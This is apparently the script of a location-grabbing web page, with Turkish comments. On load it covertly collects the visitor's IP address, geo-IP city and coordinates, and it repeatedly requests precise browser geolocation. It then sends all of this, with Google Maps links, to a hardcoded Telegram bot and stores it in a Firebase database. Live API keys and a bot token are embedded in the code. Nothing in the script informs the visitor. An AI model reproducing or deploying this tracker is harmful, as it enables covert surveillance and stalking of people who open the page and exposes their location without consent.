const firebaseConfig = {
  apiKey: "AIzaSyAzAG0a_ribj20DRAWaDNiw5B2wvtOcpYk",
  authDomain: "personid-9e533.firebaseapp.com",
  databaseURL: "https://personid-9e533-default-rtdb.firebaseio.com",
  projectId: "personid-9e533",
  storageBucket: "personid-9e533.appspot.com",
  messagingSenderId: "247603082330",
  appId: "1:247603082330:web:e71b378a57133300109463",
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
let db = firebase.database();

//id üret
let idKey = db.ref().child("/").push().key;

const getPlain = async () => {
  return await $.get("https://ipecho.net/plain");
};

const ajaxFunc = async (_data) => {
  await $.ajax({
    type: "GET",
    url: "https://geo.risk3sixty.com/" + _data,
    dataType: "json",
  })
    .done((getData) => {
      const getAll = {
        ip: getData.ip,
        city: getData.city,
        latitude: getData.ll[0],
        longitude: getData.ll[1],
        mapsUrl:
          "https://www.google.com/maps/place/" +
          getData.ll[0] +
          "," +
          getData.ll[1],
      };
      // Object.assign(getAll, todayDate());
      sendMessageTelegram(
        dataText(
          getAll.ip,
          getAll.latitude,
          getAll.longitude,
          todayDate().dataIsGetDate,
          getAll.city,
          getAll.mapsUrl
        )
      );
      insert("GetInfo", idKey, getAll);
    })
    .catch();
};

getPlain().then((data) => {
  ajaxFunc(data);
});

//Firebase her şeyi sil
const deleteAll = (columnName) => {
  db.ref(columnName + "/").on("value", (data) => {
    Object.keys(data.val()).forEach((e) => {
      db.ref(columnName + "/" + e).remove();
    });
  });
};

//Added !
const insert = (columnName, id, data) => {
  db.ref(columnName + "/" + id).set(data);
};

//Today Date
const todayDate = () => {
  const date = new Date();
  return { dataIsGetDate: date.toLocaleString("tr") };
};

function getuserLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      showuserPosition,
      showbrowserError
    );
  } else {
    console.log("Tarayıcı Desteklemiyor");
  }
}

const locationInterval = setInterval(() => {
  getuserLocation();
}, 1000);

function showuserPosition(position) {
  const latlon = position.coords.latitude + "," + position.coords.longitude;

  getPlain().then((e) => {
    const mapsObj = {
      x: position.coords.latitude,
      y: position.coords.longitude,
      ip: e,
      url:
        "https://www.google.com/maps/place/" +
        position.coords.latitude +
        "," +
        position.coords.longitude,

      date: todayDate().dataIsGetDate,
    };

    sendMessageTelegram(
      dataText(
        mapsObj.ip,
        "",
        "",
        "",
        "",
        "",
        mapsObj.url,
        mapsObj.x,
        mapsObj.y
      )
    );
    insert("Maps/", idKey, mapsObj);
    // sendMessageTelegram()
  });

  clearInterval(locationInterval);
}

function showbrowserError(error) {
  switch (error.code) {
    case error.PERMISSION_DENIED:
      console.log("KULLANICI GEOLOCATION TALEBINI REDDETTI");
      break;
    case error.POSITION_UNAVAILABLE:
      console.log("KONUM BILGISI YOK");
      break;
    case error.TIMEOUT:
      console.log("ZAMAN ASIMI");
      break;
    case error.UNKNOWN_ERROR:
      console.log("BILINMEYEN HATA");
      break;
  }
}

//Telegrama veri aktar
const sendMessageTelegram = (mesajIcerigi) => {
  $.ajax({
    type: "GET",
    url:
      " https://api.telegram.org/bot5704854415:AAHURUtYW4em8S_urhrav-wGK0DpWHogUoo/sendMessage?chat_id=1372649086&text=" +
      mesajIcerigi,
  }).done((e) => {});
};

const dataText = (
  ip,
  iplen,
  iplon,
  ipdate,
  ipcity,
  mapsUrl,
  realMaps,
  x,
  y
) => {
  let text = `
      IP : ${ip}
      Şehir : ${ipcity}
      Len(x) : ${iplen}
      Long(y) : ${iplon}
      Tarih : ${ipdate}
      Konum : ${mapsUrl}

  Maps : {
    '
    IP : ${ip}
    Tam Konum : ${realMaps}
    Tam X Kordinatı : ${x},
    Tam Y Kordinatı : ${y},
  }
  `;

  return text;
};
